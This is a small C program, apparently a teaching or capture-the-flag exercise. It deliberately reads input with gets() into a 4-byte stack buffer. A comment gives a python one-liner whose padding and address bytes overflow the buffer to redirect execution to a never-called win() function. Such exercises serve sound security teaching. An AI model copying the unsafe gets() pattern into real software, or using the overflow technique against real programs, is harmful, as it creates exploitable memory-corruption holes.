#include <stdio.h>
#define BUFSIZE 4

// To run:
// python -c 'print 128*"@"+"\x20\xe0\xff\xff\xff\x7f\x00\x00\xb7\x05\x40\x00"' |./stack_overflow

void win()
{
    puts("If I am printed, I was hacked! because the program never called me!");
}
void vuln()
{
    puts("Input a string and it will be printed back!");
    char buf[BUFSIZE];
    gets(buf);
    puts(buf);
    fflush(stdout);
}
int main(int argc, char **argv)
{
    vuln();
    return 0;
}
